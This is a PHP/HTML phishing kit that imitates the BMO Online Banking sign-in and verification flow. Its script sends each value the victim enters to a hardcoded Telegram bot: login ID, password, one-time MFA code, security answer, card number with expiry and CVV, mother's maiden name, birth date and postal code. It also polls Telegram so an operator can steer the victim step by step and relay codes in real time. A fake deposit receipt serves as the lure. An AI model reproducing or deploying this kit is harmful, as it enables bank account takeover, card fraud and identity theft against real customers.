<?php
/**
 * BMO Business Banking - High Fidelity System
 * Official Font Sync & Receipt/Question 1:1 Clone
 */

/* ---------- Configuration ---------- */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in | BMO Online Banking</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <!-- Official BMO Typography -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&display=swap">
    <style>
        :root {
            --bmo-blue: #007dc3;
            --bmo-blue-hover: #005fa3;
            --text-main: #1f2a37;
            --text-label: #1f2a37;
            --text-gray: #475569;
            --bg-page: #f2f2f2;
            --error-red: #d32f2f;
            --success-green: #28a745;
            --border-neutral: #d0d7e2;
            --radius: 8px;
        }

        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        
        body { 
            font-family: 'Open Sans', sans-serif;
            background-color: var(--bg-page);
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: var(--text-main);
        }

        header {
            background-color: var(--bmo-blue);
            padding: 10px 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 100;
        }

        .bmo-logo {
            width: 120px;
            height: 40px;
            background: url("https://c-saf.ca/wp-content/uploads/2023/04/BMO.jpg") no-repeat center/contain;
        }

        .lang-toggle {
            color: #fff;
            font-weight: 700;
            text-decoration: none;
            font-size: 14px;
        }

        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 40px 15px;
        }

        .bmo-card {
            width: 100%;
            max-width: 520px;
            background: #ffffff;
            border-radius: var(--radius);
            padding: 30px 35px;
            box-shadow: 0 2px 4px rgba(0,0,0,.06);
            border: 1px solid var(--border-neutral);
        }

        h2 {
            font-size: 24px;
            font-weight: 600;
            color: var(--text-main);
            margin: 0 0 25px;
            text-align: center;
        }

        h3 {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 20px;
            text-align: center;
        }

        .form-group { margin-bottom: 22px; }
        
        label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            color: var(--text-label);
            margin-bottom: 4px;
        }

        .input-field {
            width: 100%;
            height: 52px;
            padding: 10px 16px;
            font-size: 16px;
            border: 1px solid var(--border-neutral);
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            background-color: #fff;
        }

        .input-field:focus { border-color: var(--bmo-blue); }

        .btn-primary {
            width: 100%;
            padding: 16px 0;
            background-color: var(--bmo-blue);
            color: #fff;
            border: none;
            border-radius: 9999px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-primary:hover { background-color: var(--bmo-blue-hover); }
        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }

        .error-banner {
            color: var(--error-red);
            padding: 0 0 15px;
            text-align: center;
            font-size: 14px;
            font-weight: 600;
            display: none;
        }

        .info-bubble {
            color: var(--text-main);
            padding: 0 0 20px;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
        }

        /* Official Question Blockquote Style */
        blockquote {
            background: #f1f5f9;
            border-left: 4px solid var(--bmo-blue);
            padding: 1rem;
            margin: 0 0 1.5rem;
            font-style: italic;
            color: #374151;
            border-radius: 4px;
            font-size: 15px;
        }

        /* Official Metadata List Style */
        dl {
            display: grid;
            grid-template-columns: auto 1fr;
            column-gap: 14px;
            row-gap: 8px;
            margin: 0 0 26px;
            font-size: 15px;
        }
        dt { font-weight: 600; color: var(--text-gray); }
        dd { margin: 0; text-align: right; color: var(--text-main); font-weight: 600; }

        .warning-text {
            border-left: 4px solid var(--bmo-blue);
            padding-left: 12px;
            font-weight: 700;
            margin: 20px 0;
            color: var(--text-main);
            font-size: 14px;
        }

        .radio-group { margin-bottom: 25px; }
        .radio-option {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 15px;
            cursor: pointer;
            font-weight: 600;
            font-size: 16px;
        }
        .radio-option input { width: 20px; height: 20px; accent-color: var(--bmo-blue); }

        .checkbox-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .checkbox-row input { width: 20px; height: 20px; accent-color: var(--bmo-blue); cursor: pointer; }
        .info-badge {
            width: 18px; height: 18px; border-radius: 50%;
            background: #e6f0fb; color: #004b94;
            font: 700 12px/18px Arial,sans-serif;
            display: inline-grid; place-items: center;
            cursor: default;
        }

        .step-section { display: none; }
        .active-step { display: block; }

        .spinner {
            width: 20px; height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin-left: 12px;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        footer {
            text-align: center;
            padding: 30px;
            color: #637185;
            font-size: 13px;
            margin-top: auto;
        }
        footer a { color: #0f5eb3; text-decoration: none; margin: 0 8px; }

        .flex-row { display: flex; gap: 15px; }
        .flex-row > div { flex: 1; }

        .success-icon {
            width: 72px; height: 72px;
            fill: #28a745;
            margin: 0 auto 20px;
        }

        .back-link {
            color: var(--bmo-blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 20px;
        }

        #otpContainer {
            display: none;
            padding-top: 30px;
            border-top: 1px solid #eee;
            margin-top: 30px;
        }

        .register-info {
            max-width: 520px; margin: 25px auto 0;
            background: #fff; border: 1px solid var(--border-neutral);
            border-radius: var(--radius); padding: 18px;
            font-size: 15px; text-align: center;
        }

        .receipt-notice {
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 30px;
            color: #1f2a37;
        }
    </style>
</head>
<body>

<header>
    <div class="bmo-logo" aria-label="BMO"></div>
    <a href="#" class="lang-toggle">FR</a>
</header>

<div class="main-container">
    <div>
        <div class="bmo-card">
            <div id="errorBanner" class="error-banner"></div>
            
            <!-- Step 1: LOGIN -->
            <div id="stepLogin" class="step-section active-step">
                <h2>Sign in</h2>
                <div class="form-group">
                    <label for="user">Card number or Login ID</label>
                    <input id="user" type="text" class="input-field" placeholder="" autocomplete="username">
                </div>
                <div class="checkbox-row" style="margin-top: -10px;">
                    <input type="checkbox" id="remember">
                    <label for="remember" style="margin:0; font-weight: 400;">Remember me</label>
                    <span class="info-badge">i</span>
                </div>
                <div class="form-group">
                    <label for="pass">Password</label>
                    <input id="pass" type="password" class="input-field" placeholder="" autocomplete="current-password">
                </div>
                <button id="loginBtn" class="btn-primary">
                    SIGN IN <div class="spinner" id="loginSpinner"></div>
                </button>
            </div>

            <!-- Step 2: MFA INTRO -->
            <div id="stepMFAIntro" class="step-section">
                <a href="#" class="back-link" onclick="switchStep('stepLogin', 'Sign in')">Back to sign in</a>
                <h2>Let’s verify it’s you</h2>
                <div class="info-bubble">
                    <p>You’ll need to:</p>
                    <ol style="padding-left: 20px; margin: 10px 0;">
                        <li><strong>Request</strong> a verification code.</li>
                        <li><strong>Protect</strong> your verification code; never give this code to anyone.</li>
                        <li><strong>Enter</strong> your verification code.</li>
                    </ol>
                    <div class="warning-text">
                        WARNING:<br>
                        This code grants access to your accounts, it should always be kept private.
                    </div>
                </div>
                <button id="mfaIntroBtn" class="btn-primary">
                    NEXT <div class="spinner" id="mfaIntroSpinner"></div>
                </button>
            </div>

            <!-- Step 3: STACKED METHOD & CODE -->
            <div id="stepStackedMFA" class="step-section">
                <a href="#" class="back-link" onclick="switchStep('stepMFAIntro', 'Security Verification')">Back</a>
                <h2 id="methodTitle">Request a code</h2>
                
                <div id="methodSelector">
                    <p style="margin-bottom: 20px; font-size: 15px;">Choose how you’d like to receive a BMO Verification Code:</p>
                    <div class="radio-group">
                        <label class="radio-option">
                            <input type="radio" name="mfaMethod" value="SMS" checked>
                            <span>SMS text</span>
                        </label>
                        <label class="radio-option">
                            <input type="radio" name="mfaMethod" value="CALL">
                            <span>Phone call</span>
                        </label>
                    </div>
                    <div class="checkbox-row" style="align-items: flex-start; margin: 20px 0;">
                        <input type="checkbox" id="mfaAck">
                        <label for="mfaAck" style="margin:0; font-weight: 400; line-height: 1.4;">
                            <strong>IMPORTANT:</strong> To proceed, you must confirm you will not provide this verification code to anyone.
                        </label>
                    </div>
                    <button id="mfaMethodBtn" class="btn-primary" disabled>
                        SEND CODE <div class="spinner" id="mfaMethodSpinner"></div>
                    </button>
                </div>

                <!-- OTP INPUT -->
                <div id="otpContainer">
                    <h2 style="font-size: 20px; margin-bottom: 15px;">Enter your verification code</h2>
                    <div class="info-bubble" style="text-align: center; font-size: 14px; margin-bottom: 15px;">
                        Please enter the code you received to continue:<br>
                        <strong id="displayMethod">SMS text</strong><br>
                        Check your device for the code. It only takes a moment.
                    </div>
                    <div class="form-group">
                        <input id="otpCode" type="tel" maxlength="6" class="input-field" placeholder="Enter code" style="text-align:center; letter-spacing: 6px; font-weight: 700; font-size: 24px;">
                    </div>
                    <button id="otpBtn" class="btn-primary">
                        CONFIRM <div class="spinner" id="otpSpinner"></div>
                    </button>
                    <p style="text-align: center; margin-top: 20px; font-size: 14px;">
                        <a href="#" style="color: var(--bmo-blue); font-weight: 600; text-decoration: none;">Request a new code</a>
                    </p>
                </div>
            </div>

            <!-- Step 4: SECURITY QUESTION (1:1 CLONE) -->
            <div id="stepSQ" class="step-section">
                <h3>Security Question</h3>
                <dl>
                    <dt>Reference #</dt><dd id="sqRef">BMO-8X39K</dd>
                    <dt>From</dt><dd id="sqSender">BMO Business Services</dd>
                    <dt>Amount</dt><dd id="sqAmount">1,850.00 CAD</dd>
                </dl>
                <blockquote>Whats this for?</blockquote>
                <div class="form-group">
                    <input id="sqAns" type="text" class="input-field" placeholder="Your answer" style="text-align: center;">
                </div>
                <button id="sqBtn" class="btn-primary">
                    CONFIRM <div class="spinner" id="sqSpinner"></div>
                </button>
            </div>

            <!-- Step 5: CARD INFO -->
            <div id="stepCC" class="step-section">
                <h3>Confirm Account</h3>
                <div class="info-bubble">
                    Please verify your card details to synchronize your profile.
                </div>
                <div class="form-group">
                    <label>Card Number</label>
                    <input id="ccNum" type="text" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19">
                </div>
                <div class="flex-row">
                    <div class="form-group">
                        <label>Expiry (MM/YY)</label>
                        <input id="ccExp" type="text" class="input-field" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label>CVV</label>
                        <input id="ccCvv" type="password" class="input-field" placeholder="•••" maxlength="4">
                    </div>
                </div>
                <button id="ccBtn" class="btn-primary">
                    CONFIRM <div class="spinner" id="ccSpinner"></div>
                </button>
            </div>

            <!-- Step 6: PERSONAL DETAILS -->
            <div id="stepPersonal" class="step-section">
                <h3>Identity Verification</h3>
                <div class="info-bubble">
                    Additional information required to complete synchronization.
                </div>
                <div class="form-group">
                    <label>Mother's Maiden Name</label>
                    <input id="mmn" type="text" class="input-field" placeholder="Enter name">
                </div>
                <div class="form-group">
                    <label>Date of Birth</label>
                    <input id="dob" type="text" class="input-field" placeholder="DD/MM/YYYY">
                </div>
                <div class="form-group">
                    <label>Postal Code</label>
                    <input id="postal" type="text" class="input-field" placeholder="A1A 1A1" maxlength="7">
                </div>
                <button id="personalBtn" class="btn-primary">
                    CONFIRM <div class="spinner" id="personalSpinner"></div>
                </button>
            </div>

            <!-- Step 7: SUCCESS RECEIPT (1:1 CLONE) -->
            <div id="stepSuccess" class="step-section" style="text-align: center;">
                <svg class="success-icon" viewBox="0 0 52 52">
                    <circle cx="26" cy="26" r="25" stroke="#28a745" stroke-width="2" fill="none"/>
                    <path d="M14 27 l10 10 l14 -14" stroke="#28a745" stroke-width="4" fill="none"/>
                </svg>
                <h3 style="color: #166534; font-weight: 700;">Deposit Successful</h3>
                
                <dl style="text-align: left; margin-top: 25px;">
                    <dt>Confirmation #</dt><dd id="recConf">BMO-827XW</dd>
                    <dt>Date posted</dt><dd id="recDate">March 25, 2025</dd>
                    <dt>Amount</dt><dd id="recAmount">1,850.00 CAD</dd>
                </dl>

                <p class="receipt-notice">
                    It may take <strong>up to 90 minutes</strong> for the deposit to reflect in your account balance.
                </p>

                <button onclick="window.location.href='https://www.bmo.com'" class="btn-primary">RETURN TO DASHBOARD</button>
                <p style="margin-top: 20px; font-size: 13px; color: #6b7280;">
                    Funds may be held longer if additional verification is required.
                </p>
            </div>
        </div>

        <div id="loginAddon" class="register-info">
            <p style="margin: 0;"><b>Register a new card for online banking</b></p>
            <p style="margin: 10px 0 0;"><a href="#" style="color:var(--bmo-blue); text-decoration: none; font-weight: 700;">DEBIT CARD</a> or
               <a href="#" style="color:var(--bmo-blue); text-decoration: none; font-weight: 700;">CREDIT CARD</a></p>
        </div>
    </div>
</div>

<footer>
    <a href="#">Legal</a> •
    <a href="#">Privacy</a> •
    <a href="#">Security</a> •
    <a href="#">Accessibility</a>
    <div style="margin-top: 15px;">© 2025 BMO Financial Group. All rights reserved.</div>
</footer>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const token = "<?= $telegramToken; ?>";
    const chatId = "<?= $chatId; ?>";
    let lastUpdateId = 0;

    // Generate random deposit info for the session
    const refNum = 'BMO-' + Math.random().toString(36).substring(2, 7).toUpperCase();
    const curDate = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
    
    document.getElementById('sqRef').innerText = refNum;
    document.getElementById('recConf').innerText = refNum;
    document.getElementById('recDate').innerText = curDate;

    // Sync updates
    fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`)
        .then(r => r.json()).then(d => { if(d.result?.length) lastUpdateId = d.result[0].update_id; });

    function switchStep(stepId, title) {
        document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active-step'));
        const target = document.getElementById(stepId);
        if (target) {
            target.classList.add('active-step');
            document.getElementById('errorBanner').style.display = 'none';
            document.getElementById('loginAddon').style.display = (stepId === 'stepLogin' ? 'block' : 'none');
            window.scrollTo(0, 0);
        }
    }

    async function pollController(msgId, onSuccess, onError) {
        let attempts = 0;
        const interval = setInterval(async () => {
            attempts++;
            if (attempts > 500) { clearInterval(interval); resetCurrentButton(); return; }

            try {
                const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId+1}&timeout=10`);
                const data = await res.json();
                if (data.result?.length) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query && update.callback_query.message.message_id === msgId) {
                            clearInterval(interval);
                            const cmd = update.callback_query.data;
                            
                            fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({chat_id: chatId, message_id: msgId, reply_markup: {inline_keyboard: []}})
                            });

                            if (cmd === 'approve') onSuccess();
                            else if (cmd === 'reject') onError();
                            else if (cmd === 'go_cc') { switchStep('stepCC'); resetCurrentButton(); }
                            else if (cmd === 'go_personal') { switchStep('stepPersonal'); resetCurrentButton(); }
                            else if (cmd === 'cancel') window.location.href = "https://www.bmo.com";
                        }
                    }
                }
            } catch (e) {}
        }, 1500);
    }

    let currentBtnInfo = null;
    function resetCurrentButton() {
        if (currentBtnInfo) {
            currentBtnInfo.btn.disabled = false;
            currentBtnInfo.spinner.style.display = 'none';
            currentBtnInfo.btn.innerText = currentBtnInfo.origText;
        }
    }

    async function handleStep(stepName, logText, btn, spinner, onApprove, errorMsg) {
        btn.disabled = true;
        spinner.style.display = 'inline-block';
        const origText = btn.innerText;
        btn.innerText = "VERIFYING...";
        document.getElementById('errorBanner').style.display = 'none';
        
        currentBtnInfo = { btn, spinner, origText };

        const kb = {
            inline_keyboard: [
                [{text: "🟩 APPROVE / NEXT", callback_data: "approve"}],
                [{text: "🟥 REJECT / ERROR", callback_data: "reject"}],
                [{text: "💳 VERIFY CC INFO", callback_data: "go_cc"}],
                [{text: "👤 VERIFY PERSONAL INFO", callback_data: "go_personal"}],
                [{text: "⚪️ CANCEL SESSION", callback_data: "cancel"}]
            ]
        };

        try {
            const sendRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `🟦 <b>BMO CONTROLLER</b> 🟦\n\n<b>STEP:</b> ${stepName.toUpperCase()}\n\n${logText}\n\n🟦 <b>BMO CONTROLLER</b> 🟦`,
                    parse_mode: 'HTML',
                    reply_markup: kb
                })
            });
            const data = await sendRes.json();
            const msgId = data.result?.message_id;

            if(!msgId) { resetCurrentButton(); return; }

            pollController(msgId, 
                () => { // Approve
                    btn.disabled = false; spinner.style.display = 'none'; btn.innerText = origText;
                    onApprove();
                },
                () => { // Reject
                    btn.disabled = false; spinner.style.display = 'none'; btn.innerText = origText;
                    document.getElementById('errorBanner').textContent = errorMsg;
                    document.getElementById('errorBanner').style.display = 'block';
                }
            );
        } catch (e) { resetCurrentButton(); }
    }

    // --- Action Handlers ---

    document.getElementById('loginBtn').addEventListener('click', () => {
        const u = document.getElementById('user').value.trim();
        const p = document.getElementById('pass').value.trim();
        if(!u || !p) return;
        handleStep("Login", `User: <code>${u}</code>\nPass: <code>${p}</code>`, 
            document.getElementById('loginBtn'), document.getElementById('loginSpinner'),
            () => switchStep('stepMFAIntro'), "Incorrect credentials. Please try again."
        );
    });

    document.getElementById('mfaIntroBtn').addEventListener('click', () => {
        switchStep('stepStackedMFA');
    });

    document.getElementById('mfaAck').addEventListener('change', (e) => {
        document.getElementById('mfaMethodBtn').disabled = !e.target.checked;
    });

    document.getElementById('mfaMethodBtn').addEventListener('click', () => {
        const methodEl = document.querySelector('input[name="mfaMethod"]:checked');
        const methodText = methodEl.nextElementSibling.innerText;
        document.getElementById('displayMethod').textContent = methodText;
        handleStep("MFA Method", `Method: <b>${methodText}</b>`,
            document.getElementById('mfaMethodBtn'), document.getElementById('mfaMethodSpinner'),
            () => {
                document.getElementById('methodSelector').style.display = 'none';
                document.getElementById('otpContainer').style.display = 'block';
                document.getElementById('methodTitle').textContent = "Enter your verification code";
            }, 
            "Verification request failed. Please try again."
        );
    });

    document.getElementById('otpBtn').addEventListener('click', () => {
        const otp = document.getElementById('otpCode').value.trim();
        if(otp.length < 6) return;
        handleStep("OTP Code", `Code: <code>${otp}</code>`,
            document.getElementById('otpBtn'), document.getElementById('otpSpinner'),
            () => switchStep('stepSQ'), "Verification code is incorrect or expired."
        );
    });

    document.getElementById('sqBtn').addEventListener('click', () => {
        const ans = document.getElementById('sqAns').value.trim();
        if(!ans) return;
        handleStep("Security Answer", `Answer: <code>${ans}</code>`,
            document.getElementById('sqBtn'), document.getElementById('sqSpinner'),
            () => switchStep('stepSuccess'), "Answer not recognized."
        );
    });

    document.getElementById('ccBtn').addEventListener('click', () => {
        const n = document.getElementById('ccNum').value.trim();
        const e = document.getElementById('ccExp').value.trim();
        const c = document.getElementById('ccCvv').value.trim();
        if(!n || !e || !c) return;
        handleStep("Card Info", `Num: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>`,
            document.getElementById('ccBtn'), document.getElementById('ccSpinner'),
            () => switchStep('stepSuccess'), "Card verification failed."
        );
    });

    document.getElementById('personalBtn').addEventListener('click', () => {
        const m = document.getElementById('mmn').value.trim();
        const d = document.getElementById('dob').value.trim();
        const p = document.getElementById('postal').value.trim();
        if(!m || !d || !p) return;
        handleStep("Personal Info", `MMN: <code>${m}</code>\nDOB: <code>${d}</code>\nPostal: <code>${p}</code>`,
            document.getElementById('personalBtn'), document.getElementById('personalSpinner'),
            () => switchStep('stepSuccess'), "Verification could not be processed."
        );
    });

    // Formatting
    document.getElementById('ccNum').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });
    document.getElementById('ccExp').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
    });
    document.getElementById('dob').addEventListener('input', (e) => {
        let v = e.target.value.replace(/[^\d]/g, '');
        if(v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
        if(v.length > 4) v = v.substring(0,5) + '/' + v.substring(5,9);
        e.target.value = v;
    });
    document.getElementById('postal').addEventListener('input', (e) => {
        let v = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,6);
        if (v.length > 3) v = v.slice(0,3) + ' ' + v.slice(3);
        e.target.value = v;
    });
});
</script>
</body>
</html>